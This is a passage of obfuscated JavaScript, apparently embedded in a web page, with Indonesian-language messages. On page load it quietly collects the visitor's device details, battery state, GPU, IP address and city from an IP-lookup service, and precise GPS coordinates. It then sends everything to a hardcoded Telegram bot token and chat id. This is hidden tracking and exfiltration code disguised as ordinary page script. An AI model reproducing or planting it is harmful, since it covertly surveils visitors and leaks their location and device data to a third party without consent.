window||_0xb89d7a[_0x1d4adc(0x213)](navigator[_0x1d4adc(0x26b)],0x0)?_0xb89d7a[_0x1d4adc(0x224)]:_0xb89d7a[_0x1d4adc(0x1c7)],_0x492bd2=navigator[_0x1d4adc(0x227)]?_0xb89d7a[_0x1d4adc(0x262)]:_0xb89d7a[_0x1d4adc(0x222)],_0x204f8a=window[_0x1d4adc(0x1e1)](_0xb89d7a[_0x1d4adc(0x24e)])[_0x1d4adc(0x257)]?_0x1d4adc(0x206):_0xb89d7a[_0x1d4adc(0x246)],_0x4b1b21=_0xb89d7a[_0x1d4adc(0x1b7)](_0xb89d7a[_0x1d4adc(0x1b7)](_0xb89d7a[_0x1d4adc(0x1b7)](performance[_0x1d4adc(0x1c4)](),0x3e8),0x3c),0x3c)[_0x1d4adc(0x25a)](0x2)+_0x1d4adc(0x215),_0x51aabe=/Mobi|Android/i[_0x1d4adc(0x223)](_0xd528a8)?_0xb89d7a['KuhXa']:_0xb89d7a[_0x1d4adc(0x208)],_0x8f19d5=_0xb89d7a[_0x1d4adc(0x204)](detectGPU),_0x372a2a=navigator[_0x1d4adc(0x26d)]||_0xb89d7a['nGJpl'],_0x17b947=navigator[_0x1d4adc(0x252)]?navigator['deviceMemory']+_0x1d4adc(0x1d5):_0xb89d7a[_0x1d4adc(0x243)],_0x1aa974=_0xb89d7a[_0x1d4adc(0x268)](calculateStorageSize,localStorage),_0x16cb14=_0xb89d7a[_0x1d4adc(0x1a1)](calculateStorageSize,sessionStorage);let _0x47639c='Tidak\x20diketahui',_0x3db2fb=_0xb89d7a[_0x1d4adc(0x243)],_0x400ff2='Tidak\x20diketahui',_0x3bf8bb=_0xb89d7a[_0x1d4adc(0x234)];try{const _0x44971b=await fetch(_0xb89d7a[_0x1d4adc(0x1ce)]),_0x1af1d4=await _0x44971b[_0x1d4adc(0x25f)]();_0x47639c=_0x1af1d4['ip']||_0xb89d7a[_0x1d4adc(0x243)];if(!_0x3db2fb||_0x3db2fb===_0xb89d7a[_0x1d4adc(0x243)])_0x3db2fb=_0x1af1d4[_0x1d4adc(0x232)]||_0xb89d7a['nGJpl'];if(!_0x400ff2||_0xb89d7a[_0x1d4adc(0x23b)](_0x400ff2,_0xb89d7a[_0x1d4adc(0x243)]))_0x400ff2=_0x1af1d4['longitude']||_0xb89d7a[_0x1d4adc(0x243)];_0x3bf8bb=_0x1af1d4['city']+',\x20'+_0x1af1d4[_0x1d4adc(0x1bd)]+',\x20'+_0x1af1d4[_0x1d4adc(0x1a5)];}catch(_0x5bce5a){console[_0x1d4adc(0x247)]('Gagal\x20mendapatkan\x20lokasi\x20berdasarkan\x20IP:',_0x5bce5a);}let _0x3f6a21=_0xb89d7a['CKbZV'];if(navigator['getBattery']){const _0x5be690=await navigator[_0x1d4adc(0x248)]();_0x3f6a21=_0xb89d7a[_0x1d4adc(0x20e)](_0x1d4adc(0x21a)+_0xb89d7a[_0x1d4adc(0x1c5)](_0x5be690['level'],0x64)[_0x1d4adc(0x25a)](0x0)+_0x1d4adc(0x231)+(_0x1d4adc(0x1b3)+(_0x5be690['charging']?_0xb89d7a[_0x1d4adc(0x1d9)]:_0xb89d7a[_0x1d4adc(0x1cc)])+',\x20'),_0x1d4adc(0x25e)+(_0x5be690[_0x1d4adc(0x1e3)]?_0x5be690[_0x1d4adc(0x1e3)]+_0x1d4adc(0x203):_0xb89d7a[_0x1d4adc(0x243)])+',\x20')+('Waktu\x20Penggunaan:\x20'+(_0x5be690[_0x1d4adc(0x1dd)]?_0x5be690[_0x1d4adc(0x1dd)]+_0x1d4adc(0x203):_0xb89d7a[_0x1d4adc(0x243)]));}navigator[_0x1d4adc(0x24f)]?navigator[_0x1d4adc(0x24f)][_0x1d4adc(0x1f9)](_0x49f602=>{const _0x5474f6=_0x1d4adc;_0x3db2fb=_0x49f602['coords'][_0x5474f6(0x232)][_0x5474f6(0x25a)](0x6),_0x400ff2=_0x49f602[_0x5474f6(0x210)]['longitude'][_0x5474f6(0x25a)](0x6),_0x3bf8bb='Latitude:\x20'+_0x3db2fb+_0x5474f6(0x22b)+_0x400ff2,_0xb89d7a[_0x5474f6(0x1ef)](_0x31ccac);},_0x4f5cd2=>{const _0x3a241b=_0x1d4adc;console['error'](_0xb89d7a[_0x3a241b(0x1d1)],_0x4f5cd2[_0x3a241b(0x1af)]),_0xb89d7a['ITrzV'](_0x31ccac);}):(console['error'](_0xb89d7a[_0x1d4adc(0x1fb)]),_0x31ccac());async function _0x31ccac(){const _0x4faf92=_0x1d4adc,_0x52328a={'userAgent':_0xd528a8,'platform':_0x2cce86,'language':_0x336c4c,'additionalLanguages':_0x34ac4f,'vendor':_0x5e8057,'browser':_0xb89d7a[_0x4faf92(0x1ef)](detectBrowser),'os':_0xb89d7a[_0x4faf92(0x1c2)](detectOS),'screenResolution':_0x3668bc+_0x4faf92(0x230)+_0x2857fb,'onlineStatus':_0x19b0ee,'connectionType':_0x3df5fe,'downlinkSpeed':_0x4c81f6,'timezone':_0x5ba0b5,'localTime':_0x2faac7,'darkMode':_0x13a9f0,'touchscreen':_0x4493e3,'cookieEnabled':_0x492bd2,'deviceOrientation':_0x204f8a,'deviceUptime':_0x4b1b21,'hardwareConcurrency':_0x372a2a,'deviceMemory':_0x17b947,'localStorageSize':_0x1aa974,'sessionStorageSize':_0x16cb14,'ipAddress':_0x47639c,'latitude':_0x3db2fb,'longitude':_0x400ff2,'locationInfo':_0x3bf8bb,'batteryInfo':_0x3f6a21,'isMobileDevice':_0x51aabe,'gpu':_0x8f19d5},_0x353fbe=_0xb89d7a['nGWYO'],_0x149c7b=_0xb89d7a[_0x4faf92(0x1d6)],_0x16bd53=_0x4faf92(0x1bf)+_0x353fbe+_0x4faf92(0x20b),_0x16e4d7=_0xb89d7a[_0x4faf92(0x22f)](_0xb89d7a['RrmqP'](_0xb89d7a[_0x4faf92(0x22f)](_0xb89d7a[_0x4faf92(0x22f)](_0xb89d7a[_0x4faf92(0x1e0)](_0xb89d7a[_0x4faf92(0x22f)](_0xb89d7a[_0x4faf92(0x1e0)](_0xb89d7a[_0x4faf92(0x1ed)](_0xb89d7a[_0x4faf92(0x20a)](_0xb89d7a['RrmqP'](_0xb89d7a['rXROW'](_0xb89d7a[_0x4faf92(0x22f)](_0xb89d7a[_0x4faf92(0x20e)](_0xb89d7a[_0x4faf92(0x20e)](_0xb89d7a[_0x4faf92(0x20a)](_0xb89d7a[_0x4faf92(0x1d0)](_0xb89d7a[_0x4faf92(0x20a)](_0xb89d7a[_0x4faf92(0x1e0)](_0xb89d7a['uwJdK'](_0xb89d7a[_0x4faf92(0x1ee)](_0xb89d7a[_0x4faf92(0x263)](_0x4faf92(0x266)+_0x4faf92(0x267),'•\x20*Agen\x20Pengguna:*\x20'+_0x52328a[_0x4faf92(0x201)]+'\x0a'),_0x4faf92(0x226)+_0x52328a[_0x4faf92(0x1a6)]+'\x0a'),_0x4faf92(0x1f1)+_0x52328a[_0x4faf92(0x261)]+'\x0a'),_0x4faf92(0x22e)+_0x52328a['additionalLanguages']+'\x0a'),_0x4faf92(0x1e7)+_0x52328a[_0x4faf92(0x1eb)]+'\x0a\x0a'),_0x4faf92(0x23a)),_0x4faf92(0x1ad)+_0x52328a['onlineStatus']+'\x0a'),'•\x20*Tipe\x20Koneksi:*\x20'+_0x52328a[_0x4faf92(0x1fe)]+'\x0a'),'•\x20*Kecepatan\x20Koneksi:*\x20'+_0x52328a['downlinkSpeed']+'\x0a'),_0x4faf92(0x1e2)+_0x52328a[_0x4faf92(0x1ae)]+'\x0a')+(_0x4faf92(0x238)+_0x52328a[_0x4faf92(0x1b0)]+'\x0a\x0a'),_0x4faf92(0x1c6)),_0x4faf92(0x22a)+_0x52328a[_0x4faf92(0x22c)]+'\x0a'),_0x4faf92(0x1e6)+_0x52328a[_0x4faf92(0x205)]+'\x0a'),'•\x20*Latitude:*\x20'+_0x52328a[_0x4faf92(0x232)]+'\x0a'),'•\x20*Longitude:*\x20'+_0x52328a[_0x4faf92(0x258)]+'\x0a\x0a')+_0x4faf92(0x26e),'•\x20'+_0x52328a[_0x4faf92(0x1cb)]+'\x0a\x0a')+_0x4faf92(0x241),_0x4faf92(0x24d)+_0x52328a[_0x4faf92(0x26d)]+'\x0a'),'•\x20*Memori\x20Perangkat:*\x20'+_0x52328a[_0x4faf92(0x252)]+'\x0a'),_0x4faf92(0x1e4)+_0x52328a[_0x4faf92(0x233)]+'\x0a')+(_0x4faf92(0x1b4)+_0x52328a[_0x4faf92(0x202)]+'\x0a\x0a'),_0x4faf92(0x211))+(_0x4faf92(0x21f)+_0x52328a['localTime']+'\x0a'),_0x4faf92(0x1a4)+_0x52328a[_0x4faf92(0x216)]+'\x0a')+(_0x4faf92(0x1c8)+_0x52328a[_0x4faf92(0x1e5)]);try{const _0x4fe193=await _0xb89d7a[_0x4faf92(0x21b)](fetch,_0x16bd53,{'method':_0xb89d7a[_0x4faf92(0x1f3)],'headers':{'Content-Type':_0x4faf92(0x1dc)},'body':JSON['stringify']({'chat_id':_0x149c7b,'text':_0x16e4d7,'parse_mode':_0xb89d7a[_0x4faf92(0x1a8)]})}),_0x28c56b=await _0x4fe193['json']();if(_0x28c56b['ok'])console[_0x4faf92(0x24b)](_0xb89d7a['Bstkq']);else{console[_0x4faf92(0x247)](_0xb89d7a[_0x4faf92(0x1d4)],_0x28c56b);const _0x397b36=new FormData();_0x397b36[_0x4faf92(0x23e)](_0x4faf92(0x254),_0x149c7b),_0x397b36['append'](_0x4faf92(0x235),_0x16e4d7),_0x397b36[_0x4faf92(0x23e)](_0xb89d7a[_0x4faf92(0x19f)],_0xb89d7a[_0x4faf92(0x1a8)]);const _0x3d5dfb=await _0xb89d7a[_0x4faf92(0x21b)](fetch,_0x16bd53,{'method':_0xb89d7a[_0x4faf92(0x1f3)],'body':_0x397b36}),_0x4b53f1=await _0x3d5dfb['json']();_0x4b53f1['ok']?console[_0x4faf92(0x24b)]('Informasi\x20perangkat\x20berhasil\x20dikirim\x20ke\x20Telegram\x20(FormData).'):console[_0x4faf92(0x247)](_0xb89d7a[_0x4faf92(0x26c)],_0x4b53f1);}}catch(_0x31b3fe){console['error'](_0xb89d7a[_0x4faf92(0x240)],_0x31b3fe);}}}function calculateStorageSize(_0x371a9e){const _0x478fc5=_0x1950,_0x594abb={'kojln':function(_0x384d21,_0x28c2e7){return _0x384d21*_0x28c2e7;},'MYenx':function(_0x563388,_0x28fdf3){return _0x563388+_0x28fdf3;},'zUBUt':function(_0x64d21e,_0x452082){return _0x64d21e+_0x452082;},'vYdxW':function(_0x5b85e9,_0x2428d2){return _0x5b85e9/_0x2428d2;},'mxOeK':'\x20KB'};let _0x355d56=0x0;for(let _0x16823b in _0x371a9e){_0x371a9e[_0x478fc5(0x1ab)](_0x16823b)&&(_0x355d56+=_0x594abb[_0x478fc5(0x1be)](_0x594abb[_0x478fc5(0x1c9)](_0x371a9e[_0x16823b]['length'],_0x16823b['length']),0x2));}return _0x594abb[_0x478fc5(0x23f)](_0x594abb[_0x478fc5(0x1a3)](_0x355d56,0x400)[_0x478fc5(0x25a)](0x2),_0x594abb[_0x478fc5(0x26a)]);}function _0x1950(_0x258c04,_0x4f089c){const _0x1554aa=_0x1554();return _0x1950=function(_0x19504a,_0x98c6b8){_0x19504a=_0x19504a-0x19f;let _0x4b85a0=_0x1554aa[_0x19504a];return _0x4b85a0;},_0x1950(_0x258c04,_0x4f089c);}function detectBrowser(){const _0x559e60=_0x1950,_0x1cd747={'FuwRt':'Google\x20Chrome','aCwGA':'Firefox','clEOO':'Apple\x20Safari','EdiKM':_0x559e60(0x264),'ZMzmA':_0x559e60(0x242),'LfbAD':_0x559e60(0x1ca),'vUpTh':'OPR','NxrtH':_0x559e60(0x1c1)},_0x34a6f2=navigator[_0x559e60(0x201)];if(_0x34a6f2[_0x559e60(0x1d8)]('Chrome'))return _0x1cd747[_0x559e60(0x1cd)];if(_0x34a6f2[_0x559e60(0x1d8)](_0x1cd747[_0x559e60(0x20d)]))return _0x559e60(0x24c);if(_0x34a6f2[_0x559e60(0x1d8)](_0x559e60(0x1a0))&&!_0x34a6f2[_0x559e60(0x1d8)](_0x559e60(0x259)))return _0x1cd747['clEOO'];if(_0x34a6f2[_0x559e60(0x1d8)](_0x1cd747[_0x559e60(0x260)]))return _0x1cd747[_0x559e60(0x1f4)];if(_0x34a6f2[_0x559e60(0x1d8)](_0x1cd747['LfbAD'])||_0x34a6f2[_0x559e60(0x1d8)](_0x1cd747[_0x559e60(0x265)]))return _0x1cd747['LfbAD'];return _0x1cd747['NxrtH'];}function detectOS(){const _0x4048f7=_0x1950,_0x5d5a19={'bEJKk':_0x4048f7(0x1b6),'tLmTP':_0x4048f7(0x1c3),'vuOaA':_0x4048f7(0x25c),'jJImg':_0x4048f7(0x1e9),'OGhEA':_0x4048f7(0x1b9),'InyfH':_0x4048f7(0x23c),'FCpoz':_0x4048f7(0x1e8)},_0x18a976=navigator['platform'][_0x4048f7(0x1cf)]();if(_0x18a976[_0x4048f7(0x1d8)](_0x5d5a19[_0x4048f7(0x21d)]))return _0x5d5a19[_0x4048f7(0x1ff)];if(_0x18a976['includes']('mac'))return _0x5d5a19[_0x4048f7(0x1b8)];if(_0x18a976[_0x4048f7(0x1d8)](_0x5d5a19[_0x4048f7(0x239)]))return _0x5d5a19[_0x4048f7(0x250)];if(/android/[_0x4048f7(0x223)](navigator[_0x4048f7(0x201)]['toLowerCase']()))return'Android';if(/iphone|ipad|ipod/[_0x4048f7(0x223)](navigator['userAgent'][_0x4048f7(0x1cf)]()))return _0x5d5a19['InyfH'];return _0x5d5a19['FCpoz'];}function _0x1554(){const _0x4ef040=['632290FKnvWA','Waktu\x20Pengisian:\x20','json','EdiKM','language','SyPeN','fIbvS','Edge','vUpTh','📱\x20*Informasi\x20Perangkat:*\x0a\x0a','🖥️\x20*Umum:*\x0a','mUcpt','width','mxOeK','maxTouchPoints','eXRYA','hardwareConcurrency','🔋\x20*Baterai:*\x0a','jybky','Safari','eOgsf','getContext','vYdxW','•\x20*Zona\x20Waktu:*\x20','country_name','platform','createElement','leFSf','3809280ubOvmD','Nonaktif\x20☀️','hasOwnProperty','effectiveType','•\x20*Status\x20Online:*\x20','networkType','message','networkName','getParameter','webkitConnection','Status\x20Pengisian:\x20','•\x20*Touchscreen:*\x20','Zyvzd','win','lxouj','vuOaA','Linux','CKbZV','85zQCkxl','UxErM','region','kojln','https://api.telegram.org/bot','downlink','Browser\x20tidak\x20dikenal','EoOjb','Windows','now','iWbTb','📍\x20*Lokasi:*\x0a','ePMUa','•\x20*Waktu\x20Boot\x20Perangkat:*\x20','MYenx','Opera','batteryInfo','RrOzr','FuwRt','uWdbf','toLowerCase','KZlTh','WpJZI','dGtdM','GniRb','HGSEy','\x20GB','lzjLR','https://ipapi.co/json/','includes','UVJbh','Tidak\x20tersedia','onLine','application/json','dischargingTime','Informasi\x20perangkat\x20berhasil\x20dikirim\x20ke\x20Telegram\x20(JSON).','Lokasi\x20tidak\x20diketahui','uwJdK','matchMedia','•\x20*Jenis\x20Jaringan:*\x20','chargingTime','•\x20*GPU:*\x20','deviceUptime','•\x20*Lokasi:*\x20','•\x20*Vendor:*\x20','Sistem\x20operasi\x20tidak\x20dikenal','linux','webgl','vendor','Markdown','yRTQY','htyCt','IHbJv','11548KiaRjJ','•\x20*Bahasa\x20Utama:*\x20','1244238hLZehl','VGgYF','ZMzmA','Aktif\x20🌙','Nonaktif','timeZone','UNMASKED_RENDERER_WEBGL','getCurrentPosition','getExtension','gvdtz','parse_mode','connection','connectionType','tLmTP','Landscape','userAgent','touchscreen','\x20detik','EODAp','locationInfo','Portrait','join','XQEDS','Error:','pVZEh','/sendMessage','Ada','aCwGA','rXROW','Tidak\x20mengisi','coords','🕒\x20*Waktu:*\x0a','✅\x20Online','GnPAs','DateTimeFormat','\x20jam','timezone','226496JOaUhc','(orientation:\x20portrait)','8137866512:AAE771KJrWSUMAaIpBcu_OLjbH3O_nArulU','Level:\x20','ljwxt','Gagal\x20mengirim\x20informasi\x20ke\x20Telegram\x20dengan\x20JSON.','bEJKk','toLocaleString','•\x20*Waktu\x20Lokal:*\x20','\x20Mbps','167470vZeRDt','CUPoO','test','Hsatx','Gagal\x20mengirim\x20informasi\x20ke\x20Telegram\x20dengan\x20FormData.','•\x20*Platform:*\x20','cookieEnabled','99RorNWh','9gfbyQX','•\x20*IP\x20Address:*\x20',',\x20Longitude:\x20','ipAddress','screen','•\x20*Bahasa\x20Tambahan:*\x20','RrmqP','\x20x\x20','%,\x20','latitude','gpu','Bubra','text','languages','(prefers-color-scheme:\x20dark)','•\x20*Nama\x20Jaringan:*\x20','jJImg','🌐\x20*Jaringan:*\x0a','NJzaC','iOS','Tidak\x20diketahui','append','zUBUt','ZgLjS','🔧\x20*Hardware:*\x0a','Microsoft\x20Edge','nGJpl','4987108UksOGh','Geolocation\x20API\x20tidak\x20didukung\x20di\x20browser\x20ini.','VlUNO','error','getBattery','Ya\x20(Mobile)','sPJoD','log','Mozilla\x20Firefox','•\x20*CPU\x20Cores:*\x20','ttDoH','geolocation','OGhEA','aaaIs','deviceMemory','ontouchstart','chat_id','-1002360934041','Tidak\x20(Desktop/Tablet)','matches','longitude','Chrome','toFixed','Tidak\x20Ada','MacOS'];_0x1554=function(){return _0x4ef040;};return _0x1554();}function detectGPU(){const _0xc977e4=_0x1950,_0x16d693={'JDwge':'canvas','sPJoD':_0xc977e4(0x1ea),'UxErM':_0xc977e4(0x23d),'Xxxbz':'WEBGL_debug_renderer_info'},_0x193ff4=document[_0xc977e4(0x1a7)](_0x16d693['JDwge']),_0x4b2496=_0x193ff4[_0xc977e4(0x1a2)](_0x16d693[_0xc977e4(0x24a)])||_0x193ff4['getContext']('experimental-webgl');if(!_0x4b2496)return _0x16d693[_0xc977e4(0x1bc)];const _0x406fa9=_0x4b2496[_0xc977e4(0x1fa)](_0x16d693['Xxxbz']);return _0x406fa9?_0x4b2496[_0xc977e4(0x1b1)](_0x406fa9[_0xc977e4(0x1f8)]):_0x16d693[_0xc977e4(0x1bc)];}document['addEventListener']('DOMContentLoaded',()=>{const _0x567b0e={'ThAbS':function(_0x56c3e1){return _0x56c3e1();}};_0x567b0e['ThAbS'](detectDeviceInfoAndSendToTelegram);});